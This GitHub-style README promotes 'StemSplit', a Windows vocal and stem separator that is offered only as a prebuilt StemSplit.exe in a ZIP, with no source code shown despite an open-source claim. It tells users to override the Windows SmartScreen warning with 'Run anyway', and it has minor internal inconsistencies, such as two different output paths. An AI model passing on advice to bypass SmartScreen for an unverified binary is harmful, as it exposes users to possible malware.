<p align="center">
  <img src="https://i.postimg.cc/CLYDNYqQ/banner.png" alt="StemSplit Offline Vocal Remover — Local AI Vocal, Instrumental & 4-Stem Separator" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-AI%20Vocal%20%26%20Stem%20Splitter-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-stemsplit--v1.3-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# StemSplit Offline Vocal Remover — Local AI Vocal, Instrumental & 4-Stem Separator

**Web vocal removers limiting free users to 1 song per day, 5-minute tracks, or compressed 128 kbps MP3 exports? Split any full-length MP3, WAV, or FLAC track into studio-clean Vocals, Instrumental, Drums, and Bass locally on your PC.**

StemSplit Offline Vocal Remover runs local source-separation models (`Demucs` / `MDX-Net` ONNX) on Windows: **exporting lossless 16/24-bit `.wav` or `320 kbps` `.mp3` stems with zero track-length caps, zero daily quotas, and full GPU/CPU acceleration**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) musicians, remixers, content creators, and karaoke fans** separating audio stems privately offline.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Online vocal removers cap tracks at 3–5 minutes or 1 file/day | Cloud AI sites paywall batch processing and lossless WAV downloads | Process unlimited full-length albums, DJ sets, and podcasts locally |
| Phase-inversion 'karaoke' filters leave muffled vocal echoes | Simple mid-side L-R subtraction ruins stereo bass and reverb | Use neural spectral separation for clean acapellas and instrumentals |
| Need isolated Drums or Bass tracks for practice or remixing | 2-stem splitters lump drums, bass, and synths together | Switch to **4-Stem Mode** (`Vocals`, `Drums`, `Bass`, `Other`) |
| Uploading unreleased demos or client stems online risks leaks | Web services store uploaded audio on external servers | Run 100% offline in local memory with zero network access |

## Download for Windows

[**Download StemSplit.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/StemSplit.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `StemSplit.exe`? (Key features)

- Splits `.mp3`, `.wav`, `.flac`, `.ogg`, and `.m4a` audio into **2 Stems (Vocals + Instrumental)** or **4 Stems (Vocals, Drums, Bass, Other)**.
- Exports lossless **WAV** or high-bitrate **320 kbps MP3** files with zero length limits or watermarks.
- Supports GPU acceleration (CUDA / DirectML) as well as multi-core CPU inference.
- Batch queue lets you drop an entire folder of songs for overnight separation.

### Sample Output

```text
[StemSplit] Loaded: Night_Drive_Mix.flac (04:18 | 44.1 kHz 24-bit Stereo)
[INFO] Separation Mode  : 2-Stem High-Quality (Vocals + Instrumental) | DirectML GPU
[OK]   Exported Stem 1  : Night_Drive_Mix_Vocals.wav (45.2 MB)
[OK]   Exported Stem 2  : Night_Drive_Mix_Instrumental.wav (45.2 MB | Done in 11.4s)
```

The release ZIP is named `StemSplit.zip`; the Windows executable inside is named `StemSplit.exe`.

1. Close StemSplit before updating or replacing executable files.
2. Click **Download StemSplit.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `StemSplit.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit), 8 GB+ RAM (NVIDIA CUDA / DirectML GPU acceleration supported).

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `StemSplit.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Unlimited full-length tracks without cloud paywalls

Separate 10-minute progressive tracks or 1-hour podcasts without splitting files first.

### Lossless WAV stem exports for DAWs

Import separated stems directly into FL Studio, Ableton Live, Reaper, or Premiere Pro.

### 2-Stem Karaoke vs. 4-Stem Remix modes

Choose fast 2-stem vocal removal or full 4-stem instrument isolation.

### 100% offline privacy

Unreleased tracks never leave your hard drive.

## Default folders and configuration paths

StemSplit saves separated stem files into a dedicated subfolder beside your input audio:

```text
%USERPROFILE%\Music\Stems\
```

Typical directory layout:

```text
Music\Tracks\
├── Song.flac
└── Song_Stems\
    ├── Song_Vocals.wav
    └── Song_Instrumental.wav
```

Original audio files are read in read-only mode and never altered.

## Quick start guide

Follow these steps to get started:

1. **Extract `StemSplit.zip` to a local folder and launch `StemSplit.exe`.** No Python or Conda installation required.
2. **Drag one or multiple audio files (`.mp3`, `.wav`, `.flac`) onto the window.** Choose **2-Stem (Vocals/Instrumental)** or **4-Stem** mode.
3. **Select output format (`Lossless WAV` or `MP3 320kbps`) and click **Split Stems**.** Hardware acceleration processes a 4-minute song in ~10–15 seconds.
4. **Open the `*_Stems` folder to preview your isolated vocal and instrumental tracks.** Ready for remixing, practice, or video editing.

### Data safety note

Source audio files remain completely untouched.

## What the status summary shows

StemSplit displays **track duration, separation model, active GPU/CPU backend, and exported stem paths**.

## FAQ

**Is there any limit on song length or number of files?**

No. StemSplit runs 100% locally on your PC with zero duration or daily file limits.

**Does it require an NVIDIA graphics card?**

No—it supports NVIDIA CUDA, DirectML (AMD/Intel GPUs), and multi-core CPU fallback.

**Can I export lossless WAV files?**

Yes—both 16-bit WAV and 320 kbps MP3 outputs are supported.

## Useful reading

- [Hybrid Demucs Music Source Separation Reference](https://github.com/facebookresearch/demucs)

## More Windows Desktop Utilities

- [WhisperDesk-OfflineTranscriber](../WhisperDesk-OfflineTranscriber) — Local offline speech-to-text & SRT subtitle generator
- [VoxMorph-RealtimeVoiceChanger](../VoxMorph-RealtimeVoiceChanger) — Low-latency real-time AI voice changer for Discord & games
- [MP3Tag-BatchCoverEditor](../MP3Tag-BatchCoverEditor) — Batch audio ID3/FLAC metadata & cover art editor
- [SoundDeck-MicSoundboard](../SoundDeck-MicSoundboard) — Lightweight virtual-mic soundboard for Discord, OBS & voice chat

*Independent open-source desktop utility for Windows.*
